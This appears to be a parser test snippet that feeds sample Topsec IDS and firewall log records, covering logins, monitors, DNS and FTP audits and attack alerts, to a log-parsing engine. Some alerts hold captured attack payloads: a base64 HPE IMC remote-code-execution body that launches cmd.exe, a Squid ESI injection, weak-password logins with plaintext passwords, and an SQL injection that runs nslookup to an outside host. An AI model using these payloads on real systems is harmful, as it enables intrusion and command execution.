      String data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.17.23.75\" time=\"2020-04-21 10:59:06\" index=\"301\" recorder=\"urlfilter\" type=\"26\" sub_type=\"2606\" level=\"2\" sid=\"5e9e603701349ae\" proto=\"2\" sip=\"123.113.106.25\" sport=\"61086\" dip=\"184.50.87.144\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth51\" ddev=\"\" smac=\"A4:93:4C:C6:81:29\" dmac=\"E4:A8:B6:47:61:CF\" op=\"1\" rule=\"0\" msg=\"1231\" repeat=\"1\" cve=\"\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"(http://www.arubanetworks.com/wp-content/themes/Aruba2015/images/pulse-page-background.jpg)\" fingerprint=\"\" request=\"\" response_code=\"\" response=\"\" file=\"\" client=\",Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\" server=\"\" sgeo=\"中国 北京市 北京市 朝阳区\" dgeo=\"中国 中国香港 香港特别行政区\" result=\"0\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"102\" recorder=\"admin\" user=\"superman\" src=\"192.168.1.2\" op=\"local login\" method=\"WEBUI\" result=\"0\" description=\"login success\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.23.2\" time=\"2020-02-20 17:40:03\" index=\"104\" recorder=\"admin_config\" user=\"superman\" description=\"add admin name a12345 success.\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 03:45:19\" index=\"301\" recorder=\"attack\" type=\"2\" sub_type=\"208\" level=\"3\" sid=\"427926682563871722\" proto=\"2\" sip=\"192.167.78.237\" sport=\"42948\" dip=\"172.21.162.34\" dport=\"6379\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"C8:1F:BE:37:33:AE\" dmac=\"00:0D:48:29:A5:77\" op=\"1\" rule=\"85110\" msg=\"REDIS弱口令登录\" repeat=\"1\" cve=\"\" app_pro=\"0\" app=\"Redis\" method=\"\" appendix=\"(AUTH=username:'';passwd:'talent')\" response_code=\"\" file=\"Event85110.20200708_034519546101.34702314.pcap\" client=\"\" server=\"\" sgeo=\"意大利\" dgeo=\"Private IP\" result=\"2\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"s2c\" fingerprint=\"\" req_header=\"\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 02:45:43\" index=\"301\" recorder=\"attack\" type=\"2\" sub_type=\"299\" level=\"3\" sid=\"427925722639071356\" proto=\"2\" sip=\"192.167.2.122\" sport=\"57788\" dip=\"172.21.5.232\" dport=\"10389\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"C8:1F:BE:37:33:AE\" dmac=\"00:0D:48:29:A5:77\" op=\"1\" rule=\"85106\" msg=\"LDAP弱口令登录\" repeat=\"1\" cve=\"\" app_pro=\"54\" app=\"LDAP\" method=\"\" appendix=\"(AUTH=username:'';passwd:'talent')\" response_code=\"\" file=\"Event85106.20200708_024543895218.35092604.pcap\" client=\"\" server=\"\" sgeo=\"意大利\" dgeo=\"Private IP\" result=\"2\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"s2c\" fingerprint=\"\" req_header=\"\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 04:01:42\" index=\"301\" recorder=\"attack\" type=\"2\" sub_type=\"299\" level=\"3\" sid=\"427926946436508113\" proto=\"2\" sip=\"172.21.7.227\" sport=\"39776\" dip=\"192.169.200.61\" dport=\"21\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"C8:1F:BE:37:33:AC\" dmac=\"00:0D:48:2A:17:4C\" op=\"1\" rule=\"85104\" msg=\"FTP弱口令登录\" repeat=\"1\" cve=\"\" app_pro=\"48\" app=\"FTP\" method=\"\" appendix=\"(AUTH=username:'';passwd:'ftpuser')\" response_code=\"\" file=\"Event85104.20200708_040142961945.35285457.pcap\" client=\"\" server=\",(vsFTPd 3.0.2)\" sgeo=\"Private IP\" dgeo=\"美国\" result=\"2\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"s2c\" fingerprint=\"\" req_header=\"\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 04:18:34\" index=\"301\" recorder=\"attack\" type=\"5\" sub_type=\"599\" level=\"2\" sid=\"427927215674903840\" proto=\"2\" sip=\"172.21.104.244\" sport=\"49148\" dip=\"180.97.34.26\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:29:A5:77\" dmac=\"C8:1F:BE:37:33:AE\" op=\"1\" rule=\"20279\" msg=\"iPlanet Web Publisher远程缓冲区溢出漏洞攻击\" repeat=\"1\" cve=\"CVE-2001-0746\" app_pro=\"1\" app=\"HTTP\" method=\"HEAD\" appendix=\"(truncated URL=http://cache.baiducontent.com/c?m=9d78d513d9d437ac4f9e91697d14c0101f4381132ba7d3020fa48449e3732b465015e2ac57530772a2d27d1716de384b99f52173471450c18cbc825ddccb85585b9f5745676c875661d00de88b182a9b66d618feae6afaa7b577d6b9d2a4d8541091195e29dca59c5a77459730ed4f6db7fb844f175b11bcfa3012a51f2877&p=926fc54ad6c501e50dbe9b7c4957&newp=882a9543929112a05aadc23d454f92695912c10e37ddc44324b9d71fd325001c1b69e3b823281603d4c6786c15e9241dbdb239256b5564e5&s=fe9fc289c3ff0af1&user=baidu&fm=sc&query=学霸被担架)\" response_code=\"200 OK\" file=\"Event20279.20200708_041830604090.1461536.pcap\" client=\",Java/1.8.0_25\" server=\",Apache\" sgeo=\"Private IP\" dgeo=\"中国 江苏省 南京市\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,202F#0,48545450#\" req_header=\"SEVBRCAvYz9tPTlkNzhkNTEzZDlkNDM3YWM0ZjllOTE2OTdkMTRjMDEwMWY0MzgxMTMyYmE3ZDMwMjBmYTQ4NDQ5ZTM3MzJiNDY1MDE1ZTJhYzU3NTMwNzcyYTJkMjdkMTcxNmRlMzg0Yjk5ZjUyMTczNDcxNDUwYzE4Y2JjODI1ZGRjY2I4NTU4NWI5ZjU3NDU2NzZjODc1NjYxZDAwZGU4OGIxODJhOWI2NmQ2MThmZWFlNmFmYWE3YjU3N2Q2YjlkMmE0ZDg1NDEwOTExOTVlMjlkY2E1OWM1YTc3NDU5NzMwZWQ0ZjZkYjdmYjg0NGYxNzViMTFiY2ZhMzAxMmE1MWYyODc3JnA9OTI2ZmM1NGFkNmM1MDFlNTBkYmU5YjdjNDk1NyZuZXdwPTg4MmE5NTQzOTI5MTEyYTA1YWFkYzIzZDQ1NGY5MjY5NTkxMmMxMGUzN2RkYzQ0MzI0YjlkNzFmZDMyNTAwMWMxYjY5ZTNiODIzMjgxNjAz\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 04:18:34\" index=\"301\" recorder=\"attack\" type=\"5\" sub_type=\"599\" level=\"2\" sid=\"427927215674903840\" proto=\"2\" sip=\"172.21.104.244\" sport=\"49148\" dip=\"180.97.34.26\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:29:A5:77\" dmac=\"C8:1F:BE:37:33:AE\" op=\"1\" rule=\"20279\" msg=\"iPlanet Web Publisher远程缓冲区溢出漏洞攻击\" repeat=\"1\" cve=\"CVE-2001-0746\" app_pro=\"1\" app=\"HTTP\" method=\"HEAD\" appendix=\"(URL=http://cache.baiducontent.com/c)\" response_code=\"200 OK\" file=\"Event20279.20200708_041830604090.1461536.pcap\" client=\",Java/1.8.0_25\" server=\",Apache\" sgeo=\"Private IP\" dgeo=\"中国 江苏省 南京市\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,202F#0,48545450#\" req_header=\"SEVBRCAvYz9tPTlkNzhkNTEzZDlkNDM3YWM0ZjllOTE2OTdkMTRjMDEwMWY0MzgxMTMyYmE3ZDMwMjBmYTQ4NDQ5ZTM3MzJiNDY1MDE1ZTJhYzU3NTMwNzcyYTJkMjdkMTcxNmRlMzg0Yjk5ZjUyMTczNDcxNDUwYzE4Y2JjODI1ZGRjY2I4NTU4NWI5ZjU3NDU2NzZjODc1NjYxZDAwZGU4OGIxODJhOWI2NmQ2MThmZWFlNmFmYWE3YjU3N2Q2YjlkMmE0ZDg1NDEwOTExOTVlMjlkY2E1OWM1YTc3NDU5NzMwZWQ0ZjZkYjdmYjg0NGYxNzViMTFiY2ZhMzAxMmE1MWYyODc3JnA9OTI2ZmM1NGFkNmM1MDFlNTBkYmU5YjdjNDk1NyZuZXdwPTg4MmE5NTQzOTI5MTEyYTA1YWFkYzIzZDQ1NGY5MjY5NTkxMmMxMGUzN2RkYzQ0MzI0YjlkNzFmZDMyNTAwMWMxYjY5ZTNiODIzMjgxNjAz\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"3\" dev_name=\"TopsecOS\" dev_ip=\"172.21.6.244\" time=\"2020-07-08 04:18:34\" index=\"301\" recorder=\"attack\" type=\"5\" sub_type=\"599\" level=\"2\" sid=\"427927215674903840\" proto=\"2\" sip=\"172.21.104.244\" sport=\"49148\" dip=\"180.97.34.26\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"00:0D:48:29:A5:77\" dmac=\"C8:1F:BE:37:33:AE\" op=\"1\" rule=\"20279\" msg=\"iPlanet Web Publisher远程缓冲区溢出漏洞攻击\" repeat=\"1\" cve=\"CVE-2001-0746\" app_pro=\"1\" app=\"HTTP\" method=\"HEAD\" appendix=\"\" response_code=\"200 OK\" file=\"Event20279.20200708_041830604090.1461536.pcap\" client=\",Java/1.8.0_25\" server=\",Apache\" sgeo=\"Private IP\" dgeo=\"中国 江苏省 南京市\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,202F#0,48545450#\" req_header=\"SEVBRCAvYz9tPTlkNzhkNTEzZDlkNDM3YWM0ZjllOTE2OTdkMTRjMDEwMWY0MzgxMTMyYmE3ZDMwMjBmYTQ4NDQ5ZTM3MzJiNDY1MDE1ZTJhYzU3NTMwNzcyYTJkMjdkMTcxNmRlMzg0Yjk5ZjUyMTczNDcxNDUwYzE4Y2JjODI1ZGRjY2I4NTU4NWI5ZjU3NDU2NzZjODc1NjYxZDAwZGU4OGIxODJhOWI2NmQ2MThmZWFlNmFmYWE3YjU3N2Q2YjlkMmE0ZDg1NDEwOTExOTVlMjlkY2E1OWM1YTc3NDU5NzMwZWQ0ZjZkYjdmYjg0NGYxNzViMTFiY2ZhMzAxMmE1MWYyODc3JnA9OTI2ZmM1NGFkNmM1MDFlNTBkYmU5YjdjNDk1NyZuZXdwPTg4MmE5NTQzOTI5MTEyYTA1YWFkYzIzZDQ1NGY5MjY5NTkxMmMxMGUzN2RkYzQ0MzI0YjlkNzFmZDMyNTAwMWMxYjY5ZTNiODIzMjgxNjAz\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.110\" time=\"2020-07-04 14:59:29\" index=\"301\" recorder=\"attack\" type=\"6\" sub_type=\"699\" level=\"1\" sid=\"427520069957981424\" proto=\"2\" sip=\"1.1.201.140\" sport=\"61073\" dip=\"1.2.181.173\" dport=\"8080\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth64\" ddev=\"feth63\" smac=\"02:1A:C5:01:00:00\" dmac=\"02:1A:C5:02:00:00\" op=\"1\" rule=\"24881\" msg=\"HPE Intelligent Management Center SelInsServerImpl.class getSelInsBean远程代码执行攻击\" repeat=\"1\" cve=\"CVE-2017-12490\" app_pro=\"1\" app=\"HTTP\" method=\"POST\" appendix=\"(URL=http://1.2.181.173:8080/imc/perfm/gwt/perfSelInsServer.gwtsvc)\" response_code=\"200 OK\" file=\"Event24881.20200620_145929333488.51516656.pcap\" client=\"\" server=\"\" sgeo=\"泰国\" dgeo=\"泰国\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"1,2F696D632F706572666D2F6777742F7065726653656C496E735365727665722E677774737663#\" req_header=\"UE9TVCAvaW1jL3BlcmZtL2d3dC9wZXJmU2VsSW5zU2VydmVyLmd3dHN2YyBIVFRQLzEuMQ0KQWNjZXB0LUVuY29kaW5nOiBpZGVudGl0eQ0KT3JpZ2luOiBodHRwOi8vMS4yLjE4MS4xNzM6ODA4MA0KSG9zdDogMS4yLjE4MS4xNzM6ODA4MA0KQ29va2llOiBKU0VTU0lPTklEPWNjZndxZ0NJQzZvQjZrWVRKbDNRMUQzazlTaW9qYm9wOyBvYW0uRmxhc2guUkVOREVSTUFQLlRPS0VOPS1CSVllRXpleDc4DQpYLUdXVC1Nb2R1bGUtQmFzZTogDQpYLUdXVC1QZXJtdXRhdGlvbjogDQpDb250ZW50LVR5cGU6IHRleHQveC1nd3QtcnBjOyBjaGFyc2V0PXV0Zi04DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1MZW5ndGg6IDQwOQ0K\" req_body=\"Nnw2fDZ8aHR0cDovLzEuMi4xODEuMTczOjgwODAvaW1jL3BlcmZtL2d3dC98NjE3MzY3NURERTdDNkU3NEU1QTMzQTU0N0JDQ0U0MkJ8Y29tLmgzYy5pbWMuZ3d0LnBlcmZtLnNlbGVjdGluc3RhbmNlLmNsaWVudC5TZWxJbnNTZXJ2ZXJ8cGFzc0JlYW5OYW1lfGphdmEubGFuZy5TdHJpbmd8IiIuZ2V0Q2xhc3MoKS5mb3JOYW1lKCJqYXZheC5zY3JpcHQuU2NyaXB0RW5naW5lTWFuYWdlciIpLm5ld0luc3RhbmNlKCkuZ2V0RW5naW5lQnlOYW1lKCJKYXZhU2NyaXB0IikuZXZhbCgidmFyIHByb2M9bmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcltcXCIoamF2YS5sYW5nLlN0cmluZ1tdKVxcIl0oW1xcImNtZC5leGVcXCIsXFwiL2NcXCIsXFwiQWlNalhUZUQubG5rXFwi\" resp_header=\"SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDIwIE1heSAyMDE5IDA3OjE3OjQ2IEdNVA0KU2VydmVyOiBBcGFjaGUtQ295b3RlLzEuMQ0KUDNQOiBDUD1DQU8gUFNBIE9VUg0KQ29udGVudC1EaXNwb3NpdGlvbjogYXR0YWNobWVudA0KQ29udGVudC1MZW5ndGg6IDEyDQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uO2NoYXJzZXQ9dXRmLTgNCg==\" resp_body=\"Ly9PS1tbXSwwLDZd\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.110\" time=\"2020-07-04 15:04:30\" index=\"301\" recorder=\"attack\" type=\"3\" sub_type=\"399\" level=\"2\" sid=\"427520150758803751\" proto=\"2\" sip=\"1.1.239.101\" sport=\"2004\" dip=\"1.2.95.173\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth64\" ddev=\"feth63\" smac=\"02:1A:C5:01:00:00\" dmac=\"02:1A:C5:02:00:00\" op=\"1\" rule=\"27989\" msg=\"Squid Proxy ESI and OpenSSL Configuration拒绝服务攻击\" repeat=\"1\" cve=\"CVE-2018-1172\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"(URL=http://1.2.95.173:80/)\" response_code=\"200 OK\" file=\"Event27989.20200620_15043098831.68995367.pcap\" client=\",Mozilla/5.0 (Android; Tablet; rv:13.0.1) Gecko/13.0.1 Firefox/13.0.1\" server=\",Apache/2.2.3\" sgeo=\"泰国\" dgeo=\"中国 广东省\" result=\"0\" x_forwarded_for=\"\" x_real_ip=\"\" direction=\"s2c\" fingerprint=\"2,3C68746D6C3E3C626F64793E3C703E764964536C6A473C2F703E3C6573693A696E636C756465207372633D22687474703A2F2F7777772E5470726556582E506A782F64435566762E68746D6C22206F6E6572726F723D22636F6E74696E7565222F3E3C2F626F64793E3C2F68746D6C3E#\" req_header=\"R0VUIC8gSFRUUC8xLjENCkhvc3Q6IDEuMi45NS4xNzM6ODANClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChBbmRyb2lkOyBUYWJsZXQ7IHJ2OjEzLjAuMSkgR2Vja28vMTMuMC4xIEZpcmVmb3gvMTMuMC4xDQpBY2NlcHQ6ICovKg0KVmlhOiAxLjQgMS4xLjIzOS4xMDEgKHNxdWlkLzMuMy40KQ0KU3Vycm9nYXRlLUNhcGFiaWxpdHk6IDEuMS4yMzkuMTAxPSJTdXJyb2dhdGUvMS4wIEVTSS80LjAiDQpYLUZvcndhcmRlZC1Gb3I6IDEzMi4xMzIuODguMjMxDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTg2NjY1OQ0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0K\" req_body=\"\" resp_header=\"SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBNb24sIDIwIE1heSAyMDE5IDA3OjE0OjU3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjMNClN1cnJvZ2F0ZS1Db250cm9sOiBtYXgtYWdlPTEsbm8tc3RvcmUsY29udGVudD0iRVNJLzEuNCINCkxhc3QtTW9kaWZpZWQ6IE1vbiwgMjAgTWF5IDIwMTkgMDc6MTQ6NTcgR01UDQpBY2NlcHQtUmFuZ2VzOiBieXRlcw0KQ29udGVudC1MZW5ndGg6IDExMg0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtVHlwZTogdGVzdC9odG1sDQo=\" resp_body=\"PGh0bWw+PGJvZHk+PHA+dklkU2xqRzwvcD48ZXNpOmluY2x1ZGUgc3JjPSJodHRwOi8vd3d3LlRwcmVWWC5QangvZENVZnYuaHRtbCIgb25lcnJvcj0iY29udGludWUiLz48L2JvZHk+PC9odG1sPg==\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.110\" time=\"2020-07-04 15:27:37\" index=\"301\" recorder=\"attack\" type=\"5\" sub_type=\"599\" level=\"1\" sid=\"427520523074163279\" proto=\"2\" sip=\"119.6.224.14\" sport=\"44009\" dip=\"101.71.83.88\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth64\" ddev=\"feth63\" smac=\"88:A6:00:0D:00:0F\" dmac=\"00:00:00:00:00:05\" op=\"1\" rule=\"21031\" msg=\"Xitami Web Server If-Modified-Since缓冲区溢出攻击\" repeat=\"1\" cve=\"CVE-2007-5067\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"(URL=http://apicdn.danmu.pptv.com/danmu/v2/pplive/ref/vod_24361533/danmu?pos=17000)\" response_code=\"\" file=\"Event21031.20200620_152728613466.1462863.pcap\" client=\",Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C\" server=\"\" sgeo=\"中国 四川省 成都市\" dgeo=\"中国 浙江省 宁波市\" result=\"2\" x_forwarded_for=\"27.11.75.34, 127.0.0.1\" x_real_ip=\"27.11.75.34\" direction=\"c2s\" fingerprint=\"1,474554#2,67613354654E4A776734795469795A716D71797763794A6350753B20745F63683D676979636D4E52563B2061646D61737465725F6178705F69703D4D6A63754D5445754E7A55754D7A513D3B2061646D61737465725F6178705F6164703D737A654A772E4D74632E4E4E512E4E39552E4E6C45324E4C45774E2E553174724330414141786D77526D0D0A436C69656E742D69703A203132372E302E302E310D0A49662D4D6F6469666965642D53696E63653A205475652C20313420694C434A7459574D78496A6F694D4759324D4463794E6A526D597A597A4D5468684F544A694F5755784D324D324E5752694E324E6B4D324D694C434A68626D\" req_header=\"R0VUIGh0dHA6Ly9hcGljZG4uZGFubXUucHB0di5jb20vZGFubXUvdjIvcHBsaXZlL3JlZi92b2RfMjQzNjE1MzMvZGFubXU/cG9zPTE3MDAwIEhUVFAvMS4xDQpIb3N0OiBhcGljZG4uZGFubXUucHB0di5jb20NClgtUmVhbC1JUDogMjcuMTEuNzUuMzQNClgtRm9yd2FyZGVkLUZvcjogMjcuMTEuNzUuMzQsIDEyNy4wLjAuMQ0KQWNjZXB0OiAqLyoNCmFwcHBsdDogY2x0DQphcHB2ZXI6IDMuNy4wLjAwMTENCkFjY2VwdC1FbmNvZGluZzogZ3ppcA0KVXNlci1BZ2VudDogTW96aWxsYS80LjAgKGNvbXBhdGlibGU7IE1TSUUgNy4wOyBXaW5kb3dzIE5UIDYuMTsgU0xDQzI7IC5ORVQgQ0xSIDIuMC41MDcyNzsgLk5FVCBDTFIgMy41LjMwNzI5OyAuTkVUIENMUiAzLjAuMzA3\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.110\" time=\"2020-07-04 15:29:55\" index=\"301\" recorder=\"attack\" type=\"1\" sub_type=\"105\" level=\"2\" sid=\"427520560123200693\" proto=\"2\" sip=\"106.75.86.21\" sport=\"53092\" dip=\"119.188.36.11\" dport=\"80\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth64\" ddev=\"feth63\" smac=\"64:F6:9D:5F:B9:2B\" dmac=\"54:A2:74:34:03:2B\" op=\"1\" rule=\"27239\" msg=\"Acunetix Web Vulnerability扫描器带外通道攻击\" repeat=\"1\" cve=\"\" app_pro=\"1\" app=\"HTTP\" method=\"GET\" appendix=\"(URL=http://www.sohu.com/tag/56676)\" response_code=\"\" file=\"Event27239.20200620_152946262959.85050549.pcap\" client=\",Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21\" server=\"\" sgeo=\"中国 北京市 北京市\" dgeo=\"中国 山东省 济南市\" result=\"2\" x_forwarded_for=\"127.0.0.1';copy (select '') to program 'nslookup dns.sqli.\\010065.3729-8081.3729.bab41.\\1.bxss.me\" x_real_ip=\"\" direction=\"c2s\" fingerprint=\"0,2E627873732E6D65#\" req_header=\"R0VUIC90YWcvNTY2NzYgSFRUUC8xLjENClJlZmVyZXI6IGh0dHA6Ly93d3cuZ29vZ2xlLmNvbS9zZWFyY2g/aGw9ZW4mcT10ZXN0aW5nDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0KSBBcHBsZVdlYktpdC81MzcuMjEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNDEuMC4yMjI4LjAgU2FmYXJpLzUzNy4yMQ0KQ2xpZW50LUlQOiAxMjcuMC4wLjENClgtRm9yd2FyZGVkLUZvcjogMTI3LjAuMC4xJztjb3B5IChzZWxlY3QgJycpIHRvIHByb2dyYW0gJ25zbG9va3VwIGRucy5zcWxpLlwwMTAwNjUuMzcyOS04MDgxLjM3MjkuYmFiNDEuXDEuYnhzcy5tZQ0KWC1Gb3J3YXJkZWQtSG9zdDogbG9jYWxob3N0DQpBY2NlcHQtTGFuZ3Vh\" req_body=\"\" resp_header=\"\" resp_body=\"\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"101\" recorder=\"config\" user=\"superman\" src=\"192.168.1.2\" result=\"0\" msg=\"ips eventset clean\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"172.18.14.240\" time=\"2020-02-20 17:29:04\" index=\"2406\" recorder=\"cputemp_monitor\" msg=\"The temperature of CPU has reached 40%!\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"206\" recorder=\"cpu_monitor\" msg=\"cpu occupancy rate too high\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"208\" recorder=\"disk_monitor\" msg=\"disk occupancy rate too high";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"207\" recorder=\"memory_monitor\" msg=\"memory occupancy rate too high\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"1\" dev_name=\"TopsecOS\" dev_ip=\"192.168.11.240\" time=\"2020-09-04 14:26:42\" index=\"2525\" recorder=\"audit_dnp3\" sid=\"429073461109850127\" proto=\"2\" sip=\"130.126.142.250\" sport=\"50300\" dip=\"130.126.140.229\" dport=\"20000\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth1\" ddev=\"\" smac=\"B8:AC:6F:AB:45:7A\" dmac=\"00:1B:21:0B:15:24\" control=\"200\" function=\"129\" username=\"\" password=\"\" file_name=\"C:/temp/DNPDeviceConfiguration written to Remote Device.xml\" file_size=\"830\" statuscode=\"0\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"\" time=\"2019-09-24 10:52:22\" index=\"407\" recorder=\"audit_dns\" sid=\"5d8984e60002c52\" proto=\"3\" sip=\"10.0.0.1\" sport=\"53\" dip=\"10.0.0.2\" dport=\"59023\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"feth1\" smac=\"10:0D:7F:5A:B4:A7\" dmac=\"00:18:F3:45:ED:74\" req_len=\"0\" rsp_len=\"109\" qclass=\"1\" qname=\"img13.360buyimg.com\" qtype=\"AAAA\" direction=\"1\" dnsflag=\"33152\" dns_reqaddrAAAA=\"img13.360buyimg.com\" dns_addrAAAA=\"\" rcode=\"0\" questions=\"1\" answer_rrs=\"1\" transaction_id=\"8149\" answer=\"img13.360buyimg.com,type:CNAME,class:IN,ttl:692,recode-data:type:1,data:img.jdcdn.com;\" authority_rrs=\"1\" authority=\"jdcdn.com,type:SOA,class:IN,ttl:328,recode-data:type:1,data:ns1.jd.com,recode-data:type:1,data:crab.jdcdn.com,recode-data:type:4,data:2013122602,recode-data:type:19,data:10800,recode-data:type:19,data:3600,recode-data:type:19,data:604800,recode-data:type:19,data:38400;\" additional_rrs=\"0\" additional=\"\" dns_txt=\"\" dns_ptr=\"\" dns_cname=\"img.jdcdn.\" dns_mx=\"\" ttl=\"692\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"201\" recorder=\"firmware\" op=\"import-webui\" result=\"0\" msg=\"firm import-webui\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"202\" recorder=\" license\" op=\"import-webui\" msg=\"license update success\"";
      parse(botuEngine, data);
      data = "vendor=\"topsec\" dev_type=\"4\" dev_name=\"\" dev_ip=\"192.168.113.101\" time=\"2019-09-18 11:32:08\" index=\"405\" recorder=\"audit_ftp\" sid=\"5d81a5380026850\" proto=\"2\" sip=\"12.1.1.100\" sport=\"54588\" dip=\"12.1.1.2\" dport=\"21\" sipv6=\"\" dipv6=\"\" vid=\"\" sdev=\"feth0\" ddev=\"\" smac=\"00:0C:29:DC:86:60\" dmac=\"00:0C:29:05:1C:67\" user=\"anonymous\" cmd=\"RETR\" ret=\"Transfer complete\" ret_code=\"226\" file=\"04--csrss.exe\"";
      parse(botuEngine, data);
      data = "vendor=\"天融信\" dev_type=\"1\" dev_name=\"ids_1\" dev_ip=\"192.168.23.1\" time=\"2018-07-06 13:30:30\" index=\"205\" recorder=\"ha\" msg=\"ha stop\"";
      parse(botuEngine, data);
